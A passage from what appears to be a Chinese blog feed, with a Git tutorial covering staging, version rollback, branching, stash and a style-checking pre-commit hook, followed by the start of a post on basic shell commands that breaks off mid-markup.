class="token punctuation">(</span>use <span class="token string">"git restore --staged &lt;file&gt;..."</span> to unstage<span class="token punctuation">)</span>        modified:   index.html        new file:   style.css<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这意味着 <code>index.html</code> 文件已被修改并添加到暂存区，而 <code>style.css</code> 是一个新文件，也已经被添加到暂存区。</p><h4 id="使用-git-diff-cached-查看暂存区的更改"><a href="#使用-git-diff-cached-查看暂存区的更改" class="headerlink" title="使用 git diff --cached 查看暂存区的更改"></a>使用 <code>git diff --cached</code> 查看暂存区的更改</h4><p><code>git diff --cached</code> 命令会显示暂存区中的更改细节。这个命令的输出与 <code>git diff</code> 类似，但只显示暂存区中的内容，而不包括工作区中尚未添加到暂存区的修改。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> <span class="token function">diff</span> <span class="token parameter variable">--cached</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者你也可以使用 <code>git diff --staged</code>，效果是一样的。</p><p>这个命令将显示具体的代码差异，即哪些行被修改、添加或删除。例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">diff</span> <span class="token parameter variable">--git</span> a/index.html b/index.htmlindex 83b2d7e<span class="token punctuation">..</span>e39a4ff <span class="token number">100644</span>--- a/index.html+++ b/index.html@@ -12,7 +12,7 @@   <span class="token operator">&lt;</span>title<span class="token operator">&gt;</span>My Website<span class="token operator">&lt;</span>/title<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>/head<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>-  <span class="token operator">&lt;</span>h<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>Hello, World<span class="token operator">!</span><span class="token operator">&lt;</span>/h<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>+  <span class="token operator">&lt;</span>h<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>Welcome to My Website<span class="token operator">&lt;</span>/h<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span> <span class="token operator">&lt;</span>/body<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>/html<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="从-Git-暂存区移除文件"><a href="#从-Git-暂存区移除文件" class="headerlink" title="从 Git 暂存区移除文件"></a>从 Git 暂存区移除文件</h4><h5 id="使用-git-restore-staged"><a href="#使用-git-restore-staged" class="headerlink" title="使用 git restore --staged"></a>使用 <code>git restore --staged</code></h5><p>用于将文件从暂存区移除，并恢复到工作区的状态。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> restore <span class="token parameter variable">--staged</span> 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="使用-git-reset"><a href="#使用-git-reset" class="headerlink" title="使用 git reset"></a>使用 <code>git reset</code></h5><p>用于回滚或取消更改。使用 <code>git reset</code> 也可以将文件从暂存区移除。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> reset 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="移除所有文件"><a href="#移除所有文件" class="headerlink" title="移除所有文件"></a>移除所有文件</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> reset<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将把暂存区中的所有文件全部移除，同时保留它们在工作区中的修改。</p><h4 id="恢复工作区文件"><a href="#恢复工作区文件" class="headerlink" title="恢复工作区文件"></a>恢复工作区文件</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> checkout -- test.txt<span class="token function">git</span> checkout <span class="token comment"># 直接还原为最新版本</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>是用于丢弃工作区中对 <code>txt</code> 文件的所有未提交更改的命令。具体来说，它将 <code>txt</code> 文件恢复到最后一次提交时的状态。</p><h4 id="版本回退"><a href="#版本回退" class="headerlink" title="版本回退"></a>版本回退</h4><h5 id="使用-git-reset-回退版本"><a href="#使用-git-reset-回退版本" class="headerlink" title="使用 git reset 回退版本"></a>使用 <code>git reset</code> 回退版本</h5><p><code>git reset</code> 用于回退到某个特定的提交，并且可以选择性地影响暂存区和工作区。</p><p>常用选项：</p><ul><li><code>--soft</code>：仅移动 <code>HEAD</code>，不影响暂存区和工作区。回退后的所有更改都保留在暂存区中。（HEAD为当前版本）</li><li><code>--mixed</code>（默认选项）：移动 <code>HEAD</code>，并重置暂存区，但保留工作区的更改。回退后的更改仍在工作区，但不在暂存区。</li><li><code>--hard</code>：移动 <code>HEAD</code>，同时重置暂存区和工作区。回退后的所有更改都被删除，不可恢复。</li></ul><p>假设你想回退到特定的提交 <code>abc123</code>。</p><ul><li><p><strong>软回退：</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> reset <span class="token parameter variable">--soft</span> abc123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将把当前分支指针（<code>HEAD</code>）移到 <code>abc123</code>，但保持工作区和暂存区的所有更改。</p></li><li><p><strong>混合回退：</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> reset <span class="token parameter variable">--mixed</span> abc123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将回退到 <code>abc123</code>，并将暂存区重置为该提交的状态，但保留工作区的更改。</p></li><li><p><strong>硬回退：</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> reset <span class="token parameter variable">--hard</span> abc123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将回退到 <code>abc123</code>，并删除所有在 <code>abc123</code> 之后的更改。这个操作不可逆，因此使用前请务必确认。</p></li></ul><h5 id="使用-git-revert-进行安全回退"><a href="#使用-git-revert-进行安全回退" class="headerlink" title="使用 git revert 进行安全回退"></a>使用 <code>git revert</code> 进行安全回退</h5><p><code>git revert</code> 用于生成一个新的提交，该提交会撤销指定的历史提交，而不会改变项目的提交历史。<code>git revert</code> 是一种“安全”的回退方式，因为它保留了所有历史记录。</p><p>假设你想撤销提交 <code>abc123</code>。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> revert abc123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将生成一个新的提交，它的作用是撤销 <code>abc123</code> 所做的更改，而不会影响 <code>abc123</code> 之前或之后的其他提交。</p><h5 id="使用-git-checkout-回退到特定提交（仅查看）"><a href="#使用-git-checkout-回退到特定提交（仅查看）" class="headerlink" title="使用 git checkout 回退到特定提交（仅查看）"></a>使用 <code>git checkout</code> 回退到特定提交（仅查看）</h5><p><code>git checkout</code> 主要用于切换分支或查看特定提交。你可以暂时回退到某个提交，但不修改当前分支的状态。</p><p>假设你想查看 <code>abc123</code> 提交的状态。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> checkout abc123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将把工作区和暂存区切换到 <code>abc123</code> 提交的状态，但不会更改当前分支的指针。如果你想回到最新的状态，可以使用：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> checkout master<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（假设你在 <code>master</code> 分支上）</p><h5 id="如何找到提交的哈希值"><a href="#如何找到提交的哈希值" class="headerlink" title="如何找到提交的哈希值"></a>如何找到提交的哈希值</h5><p>在执行版本回退前，你需要知道要回退到的提交的哈希值（类似 <code>abc123</code>）。可以使用以下命令查看提交历史：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> log<span class="token function">git</span> log <span class="token parameter variable">--pretty</span><span class="token operator">=</span>oneline <span class="token comment"># 显示一行</span><span class="token function">git</span> reset <span class="token parameter variable">--hard</span> HEAD^ <span class="token comment"># 回退上一个版本</span><span class="token function">git</span> reset <span class="token parameter variable">--hard</span> HEAD^^ <span class="token comment"># 同理</span><span class="token function">git</span> reset <span class="token parameter variable">--hard</span> HEAD~10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这将显示所有提交的日志，包括提交哈希、作者、日期和提交信息。</p><h4 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h4><p><code>git rm &lt;file&gt;</code>和<code>git add&lt;file&gt;</code>效果是一样的</p><h4 id="推送到远程仓库"><a href="#推送到远程仓库" class="headerlink" title="推送到远程仓库"></a>推送到远程仓库</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> push origin master<span class="token function">git</span> remote <span class="token parameter variable">-v</span> <span class="token comment">#查看远程库信息</span><span class="token function">git</span> remote <span class="token function">rm</span> origin <span class="token comment"># 删除关联</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="克隆远程仓库"><a href="#克隆远程仓库" class="headerlink" title="克隆远程仓库"></a>克隆远程仓库</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone git@github.com:你的用户名/仓库名.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="拉取更新"><a href="#拉取更新" class="headerlink" title="拉取更新"></a>拉取更新</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> pull origin master<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Git标签"><a href="#Git标签" class="headerlink" title="Git标签"></a>Git标签</h4><p>给某个提交打标签（通常用于发布版本）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> tag <span class="token parameter variable">-a</span> v1.0 <span class="token parameter variable">-m</span> <span class="token string">"版本1.0"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>推送标签到远程仓库：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> push origin <span class="token parameter variable">--tags</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="7-分支管理"><a href="#7-分支管理" class="headerlink" title="7. 分支管理"></a>7. 分支管理</h3><h4 id="1-创建分支"><a href="#1-创建分支" class="headerlink" title="1. 创建分支"></a>1. 创建分支</h4><p>要创建一个新的分支，使用 <code>git branch</code> 命令。新分支会基于你当前所在的分支创建。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> branch feature/new-feature<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这会创建一个名为 <code>feature/new-feature</code> 的新分支，但不会切换到该分支。</p><h4 id="2-切换分支"><a href="#2-切换分支" class="headerlink" title="2. 切换分支"></a>2. 切换分支</h4><p>使用 <code>git checkout</code> 或 <code>git switch</code> 来切换到其他分支。在 Git 2.23 之后，Git 引入了 <code>git switch</code>，它专门用于切换分支，更加直观和安全。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> checkout feature/new-feature<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> switch feature/new-feature<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将切换到 <code>feature/new-feature</code> 分支，并更新工作区和暂存区以匹配该分支的状态。</p><h4 id="3-创建并切换到新分支"><a href="#3-创建并切换到新分支" class="headerlink" title="3. 创建并切换到新分支"></a>3. 创建并切换到新分支</h4><p>可以使用 <code>git checkout -b</code> 或 <code>git switch -c</code> 在创建新分支的同时切换到该分支。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> checkout <span class="token parameter variable">-b</span> feature/new-feature<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> switch <span class="token parameter variable">-c</span> feature/new-feature<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将创建 <code>feature/new-feature</code> 分支并立即切换到该分支。</p><h4 id="4-查看分支"><a href="#4-查看分支" class="headerlink" title="4. 查看分支"></a>4. 查看分支</h4><p>要查看所有分支，可以使用 <code>git branch</code> 命令。当前所在的分支会以 <code>*</code> 标记。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> branch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输出示例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">  develop* feature/new-feature  master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这表明你当前在 <code>feature/new-feature</code> 分支上。</p><h4 id="5-合并分支"><a href="#5-合并分支" class="headerlink" title="5. 合并分支"></a>5. 合并分支</h4><p>当你完成了在某个分支上的工作并希望将其合并回主分支（例如 <code>master</code> 或 <code>develop</code>），你可以使用 <code>git merge</code> 命令。</p><p>合并分支的步骤：</p><ol><li><p>切换到目标分支（通常是 master 或 develop）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> checkout master<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>合并工作分支</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> merge feature/new-feature<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将把 <code>feature/new-feature</code>分支的更改合并到 <code>master</code>分支中。如果没有冲突，Git 会自动完成合并。如果有冲突，需要手动解决后再完成合并。</p></li></ol><h4 id="6-处理合并冲突"><a href="#6-处理合并冲突" class="headerlink" title="6. 处理合并冲突"></a>6. 处理合并冲突</h4><p>当 Git 无法自动合并两个分支时，会提示合并冲突。此时，需要手动编辑冲突的文件，解决冲突后再继续合并。</p><ol><li><p>打开冲突文件，找到冲突标记：</p><pre class="line-numbers language-diff" data-language="diff"><code class="language-diff"><span class="token deleted-arrow deleted"><span class="token prefix deleted">&lt;</span><span class="token line">&lt;&lt;&lt;&lt;&lt;&lt; HEAD</span></span>当前分支的代码=======被合并分支的代码<span class="token inserted-arrow inserted"><span class="token prefix inserted">&gt;</span><span class="token line">&gt;&gt;&gt;&gt;&gt;&gt; feature/new-feature</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>手动解决冲突</strong>，编辑文件使其符合预期。</p></li><li><p>标记冲突为已解决并提交：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> <span class="token function">add</span> 冲突文件<span class="token function">git</span> commit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h4 id="7-删除分支"><a href="#7-删除分支" class="headerlink" title="7. 删除分支"></a>7. 删除分支</h4><p>当一个分支的工作完成且不再需要时，可以将其删除。</p><p>删除本地分支：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> branch <span class="token parameter variable">-d</span> feature/new-feature<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果分支尚未合并，Git 会阻止删除，以防丢失更改。要强制删除，可以使用 <code>-D</code> 选项：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> branch <span class="token parameter variable">-D</span> feature/new-feature<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>删除远程分支：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> push origin <span class="token parameter variable">--delete</span> feature/new-feature<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将删除远程仓库中的 <code>feature/new-feature</code> 分支。</p><h4 id="8-远程分支"><a href="#8-远程分支" class="headerlink" title="8. 远程分支"></a>8. 远程分支</h4><p>远程分支是托管在远程仓库中的分支，例如 GitHub、GitLab 上的分支。通常，当你推送分支到远程仓库时，该分支会自动在远程仓库中创建。</p><p>查看远程分支：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> branch <span class="token parameter variable">-r</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将列出所有远程分支。</p><p>推送本地分支到远程：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> push origin feature/new-feature<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这会将 <code>feature/new-feature</code> 分支推送到远程仓库的 <code>origin</code>（默认远程名称）上。</p><h4 id="9-跟踪远程分支"><a href="#9-跟踪远程分支" class="headerlink" title="9. 跟踪远程分支"></a>9. 跟踪远程分支</h4><p>你可以将本地分支与远程分支关联，使推送和拉取更方便。</p><p>创建跟踪分支：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> checkout <span class="token parameter variable">-b</span> feature/new-feature origin/feature/new-feature<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者，如果分支已经存在：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> branch --set-upstream-to<span class="token operator">=</span>origin/feature/new-feature<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="10-更新远程分支"><a href="#10-更新远程分支" class="headerlink" title="10. 更新远程分支"></a>10. 更新远程分支</h4><p>要同步本地仓库与远程仓库的状态，使用 <code>git fetch</code> 或 <code>git pull</code>。</p><p>拉取更新并合并：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> pull origin master<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将从远程 <code>master</code> 分支拉取最新的更改并合并到当前分支。</p><p>仅获取更新（不合并）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> fetch origin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将更新本地的远程分支信息，但不合并更改。</p><h3 id="8-存储进度"><a href="#8-存储进度" class="headerlink" title="8.存储进度"></a>8.存储进度</h3><p><code>git stash</code> 允许你将当前的工作进度（包括工作区和暂存区的更改）暂时存储起来，以便可以在一个干净的工作区中进行其他操作。之后，你可以随时恢复这些存储的更改。</p><h4 id="1-基本命令：git-stash"><a href="#1-基本命令：git-stash" class="headerlink" title="1. 基本命令：git stash"></a>1. 基本命令：<code>git stash</code></h4><h5 id="1-1-存储当前工作区和暂存区的更改"><a href="#1-1-存储当前工作区和暂存区的更改" class="headerlink" title="1.1 存储当前工作区和暂存区的更改"></a>1.1 存储当前工作区和暂存区的更改</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> stash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这会将当前分支的工作区和暂存区的所有更改存储起来，工作区将恢复到最后一次提交时的状态。存储的更改会被放入一个“栈”中，供以后恢复使用。</p><h5 id="1-2-存储时添加描述信息"><a href="#1-2-存储时添加描述信息" class="headerlink" title="1.2 存储时添加描述信息"></a>1.2 存储时添加描述信息</h5><p>你可以为存储的更改添加描述信息，以便更容易区分多个存储。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> stash save <span class="token string">"描述信息"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="2-查看存储：git-stash-list"><a href="#2-查看存储：git-stash-list" class="headerlink" title="2. 查看存储：git stash list"></a>2. 查看存储：<code>git stash list</code></h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> stash list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这会列出所有的存储记录，每一条记录都有唯一的索引和描述信息。输出示例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">stash@<span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span>: WIP on master: 5d1e76a 修复首页布局stash@<span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span>: WIP on master: 2a7b8d9 添加新功能<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>stash@{0}</code> 是最顶部的存储记录，<code>stash@{1}</code> 是次存储记录，依此类推。</p><h4 id="3-恢复存储：git-stash-pop-和-git-stash-apply"><a href="#3-恢复存储：git-stash-pop-和-git-stash-apply" class="headerlink" title="3. 恢复存储：git stash pop 和 git stash apply"></a>3. 恢复存储：<code>git stash pop</code> 和 <code>git stash apply</code></h4><h5 id="3-1-git-stash-pop"><a href="#3-1-git-stash-pop" class="headerlink" title="3.1 git stash pop"></a>3.1 <code>git stash pop</code></h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> stash pop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这会将最近存储的更改恢复到工作区和暂存区，并将该存储记录从列表中删除。如果有冲突，Git 会提示手动解决冲突。</p><h5 id="3-2-git-stash-apply"><a href="#3-2-git-stash-apply" class="headerlink" title="3.2 git stash apply"></a>3.2 <code>git stash apply</code></h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> stash apply<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这会将最近的存储恢复到工作区和暂存区，但不会删除该存储记录。如果你需要多次应用存储，使用 <code>apply</code> 比 <code>pop</code> 更合适。</p><h4 id="3-3-恢复特定存储"><a href="#3-3-恢复特定存储" class="headerlink" title="3.3 恢复特定存储"></a>3.3 恢复特定存储</h4><p>如果有多个存储记录，你可以指定恢复某个特定的存储。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> stash apply stash@<span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这会恢复索引为 <code>stash@{1}</code> 的存储，并保留存储记录。</p><h3 id="9-常见的Git-Hooks"><a href="#9-常见的Git-Hooks" class="headerlink" title="9.常见的Git Hooks"></a>9.常见的Git Hooks</h3><ul><li><strong>pre-commit</strong>：在<code>git commit</code>命令执行之前触发。可以用来执行代码风格检查或静态分析，防止不合格的代码提交。</li><li><strong>commit-msg</strong>：在提交信息编辑完成后触发。用于检查提交信息是否符合团队规范（如强制使用特定格式）。</li><li><strong>post-commit</strong>：在提交完成后触发。可以用于执行通知或部署任务。</li></ul><h4 id="示例：自动检查代码风格"><a href="#示例：自动检查代码风格" class="headerlink" title="示例：自动检查代码风格"></a>示例：自动检查代码风格</h4><p>假设你使用<code>pre-commit</code>钩子来检查Python代码的风格是否符合PEP8标准。以下是一个简单的脚本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span><span class="token assign-left variable">files</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">git</span> <span class="token function">diff</span> <span class="token parameter variable">--cached</span> --name-only --diff-filter<span class="token operator">=</span>ACM <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'\.py$'</span><span class="token variable">)</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-z</span> <span class="token string">"<span class="token variable">$files</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token builtin class-name">exit</span> <span class="token number">0</span><span class="token keyword">fi</span><span class="token assign-left variable">unformatted</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>pycodestyle $files<span class="token variable">)</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token parameter variable">-z</span> <span class="token string">"<span class="token variable">$unformatted</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token builtin class-name">echo</span> <span class="token string">"Python代码风格检查失败:"</span>    <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$unformatted</span>"</span>    <span class="token builtin class-name">exit</span> <span class="token number">1</span><span class="token keyword">fi</span><span class="token builtin class-name">exit</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将这个脚本保存为<code>.git/hooks/pre-commit</code>并赋予可执行权限：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> +x .git/hooks/pre-commit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell</title>
      <link href="/2024/08/03/shell/"/>
      <url>/2024/08/03/shell/</url>
      
        <content type="html"><![CDATA[<h1 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h1><p>Shell 是一种用于与操作系统进行交互的命令行界面。常见的 Shell 有 Bash（Bourne Again Shell）、Zsh、Ksh、以及 Windows 上的 PowerShell。Shell 不仅可以用于执行单个命令，还可以编写脚本来自动化任务。以下是一些基本的 Shell 命令和脚本编写的示例。</p><h2 id="基本-Shell-命令"><a href="#基本-Shell-命令" class="headerlink" title="基本 Shell 命令"></a>基本 Shell 命令</h2><h3 id="文件和目录操作"><a href="#文件和目录操作" class="headerlink" title="文件和目录操作"></a>文件和目录操作</h3><ul><li><p><strong>ls</strong>：列出目录内容</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span><span class="token function">ls</span> <span class="token parameter variable">-l</span>  <span class="token comment"># 显示详细信息</span><span class="token function">ls</span> <span class="token parameter variable">-a</span>  <span class="token comment"># 显示所有文件，包括隐藏文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>cd</strong>：更改目录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /path/to/directory<span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>  <span class="token comment"># 返回上一级目录</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>pwd</strong>：显示当前工作目录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">pwd</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>mkdir</strong>：创建目录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> new_directory<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>rm</strong>：删除文件或目录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">rm</span> filename<span class="token function">rm</span> <span class="token parameter variable">-r</span> directory  <span class="token comment"># 删除目录及其内容</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>cp</strong>：复制文件或目录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> source_file destination<span class="token function">cp</span> <span class="token parameter variable">-r</span> source_directory destination  <span class="token comment"># 复制目录及其内容</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>mv</strong>：移动或重命名文件或目录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> old_name new_name<span class="token function">mv</span> <span class="token function">file</span> /path/to/destination<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><h3 id="文件查看和编辑"><a href="#文件查看和编辑" class="headerlink" title="文件查看和编辑"></a>文件查看和编辑</h3><ul><li><p><strong>cat</strong>：查看文件内容</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>less</strong>：分页查看文件内容</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">less</span> filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>head</strong>：查看文件开头部分</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">head</span> filename<span class="token function">head</span> <span class="token parameter variable">-n</span> <span class="token number">10</span> filename  <span class="token comment"># 查看前 10 行</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>tail</strong>：查看文件末尾部分</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tail</span> filename<span class="token function">tail</span> <span class="token parameter variable">-n</span> <span class="token number">10</span> filename  <span class="token comment"># 查看后 10 行</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>nano</strong>、<strong>vi</strong>、<strong>vim</strong>：文本编辑器</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nano</span> filename<span class="token function">vi</span> filename<span class="token function">vim</span> filename<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul><h3 id="系统信息和管理"><a href="#系统信息和管理" class="headerlink" title="系统信息和管理"></a>系统信息和管理</h3><ul><li><p><strong>echo</strong>：打印消息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"Hello, World!"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>whoami</strong>：显示当前用户</p><pre class="line-numbers language-bash" data-language="bash"><code 